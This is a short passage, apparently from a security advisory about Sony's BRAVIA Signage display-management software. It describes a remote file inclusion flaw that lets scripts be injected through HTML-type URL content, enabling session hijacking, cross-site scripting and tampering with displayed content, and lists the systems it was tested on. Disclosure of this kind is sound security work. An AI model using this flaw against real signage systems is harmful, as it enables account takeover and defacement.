Summary: Sony's BRAVIA Signage is an application to deliver
video and still images to Pro BRAVIAs and manage the information
via a network. Features include management of displays, power
schedule management, content playlists, scheduled delivery
management, content interrupt, and more. This cost-effective
digital signage management solution is ideal for presenting
attractive, informative visual content in retail spaces and
hotel reception areas, visitor attractions, educational and
corporate environments.

inclusion (RFI) vulnerability by including arbitrary client-side
dynamic scripts (JavaScript, VBScript, HTML) when adding content
though the input URL material of type html. This allows hijacking
the current session of the user, execute cross-site scripting code
or changing the look of the page and content modification on current
display.

Tested on: Microsoft Windows Server 2012 R2
           Ubuntu
